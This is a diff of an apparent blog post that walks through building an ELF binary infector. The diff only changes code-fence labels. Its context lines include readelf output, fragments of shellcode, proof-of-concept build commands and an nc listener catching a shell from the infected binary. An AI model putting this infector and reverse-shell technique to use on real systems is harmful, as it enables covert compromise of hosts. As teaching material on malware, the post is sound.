@@ -103,7 +103,7 @@ Our primary interest is in the `elf64_phdr` table segments. This table controls 
 
 If we take a look with `strace` we can see a bit about how binaries are loaded and executed. 
 
-```console
+```text
 $ strace /usr/bin/ls 
 execve("/usr/bin/ls", ["ls"], 0x7ffcba885000 /* 24 vars */) = 0
 brk(NULL)                               = 0x5dca6c78b000
@@ -222,7 +222,7 @@ And actually, a lot more than this happens. If we step through the program with 
 
 We only see the syscalls. But execution of the run time dynamic linker actually begins at `_dl_start` within `elf/rtld.c`, and it's much more sophisticated.[^10]
 
-```console
+```text
 $ cat breakpoints.log | grep Breakpoint | cut -f3 -d' ' | awk '!seen[$0]++'
 0x00007ffff7fe4540
 _dl_start
@@ -281,7 +281,7 @@ typedef struct elf64_phdr {
 
 For example, the `PT_DYNAMIC` segment specifies dynamic linking information. And the `PT_INTERP` segment specifies the interpreter to invoke. This is usually the dynamic linker `ld`. 
 
-```console
+```text
 $ readelf -p .interp /usr/bin/ls
 
 String dump of section '.interp':
@@ -293,7 +293,7 @@ But segments marked `PT_LOAD` denote loadable segments. `PT_LOAD` segments are d
 If we use `readelf` with the `-l` flag, we can see an ELF's program headers and each of their respective permission `Flags`: `read`, `write`, or `executable`.
 
 
-```console
+```text
 $ readelf -l /usr/bin/ls
 Elf file type is DYN (Position-Independent Executable file)
 Entry point 0x6d30
@@ -403,7 +403,7 @@ typedef Elf64_Half Elf64_Versym;
 
 If we want to see the `PT_NOTE` or `SHT_NOTE` segments of ELF binaries for ourselves, we can glean them using the `readelf` utility with the `-n` or `--notes` flag. 
 
-```console
+```text
 $ readelf -n /usr/bin/ls
 
 Displaying notes found in: .note.gnu.property
@@ -730,7 +730,7 @@ After the patch function completes, we go back to the main function where we wri
 
 Below is the assembly code of the `jump_shellcode` array. If it doesn't make sense yet, I'll try to explain below.
 
-```asm
+```nasm
 BITS 64
 %define VSIZE 0xDEADBEEFDEADBEEF   
 %define ENTRY 0xBAADF00DBAADF00D
@@ -844,7 +844,7 @@ int write_elf64_header(int fd, Elf64_Ehdr *header) {
 
 Embarrassingly, it took me a little while to get a reliable payload working. Initially, my program would segfault and I thought I messed up the infector. At another point, it would segfault while the shell would survive. And as I got closer, it would sometimes *almost* work--but yet still segfault.
 
-```console
+```text
 $ ./ls
 Segmentation fault (core dumped)
 $ ./ls
@@ -918,7 +918,7 @@ So we build the `/bin/sh` pathname array and move it to `rbx`, followed by the *
 Our final code looks like this, with `execve("/bin/sh", ["/bin/sh"], NULL)`. If all goes well, we receive a shell on our listener and the original behavior of our infected host program is preserved.
 
 
-```asm
+```nasm
 BITS 64
 global _start
 
@@ -1029,7 +1029,7 @@ The last thing we do in order to ensure our exploit runs and lands smoothly is t
 
 ## Proof of Concept
 
-```console
+```text
 $ gcc -o elf_infector elf_infector.c
 $ cp $(which ls) ls
 $ nasm -o shellcode shellcode.s
@@ -1043,7 +1043,7 @@ elf_infector  elf_infector.c  ls  shellcode  shellcode.s
 
 Meanwhile... in our other console:
 
-```console
+```text
 $ nc -lvnp 4444
 Listening on 0.0.0.0 4444
 Connection received on 127.0.0.1 51020
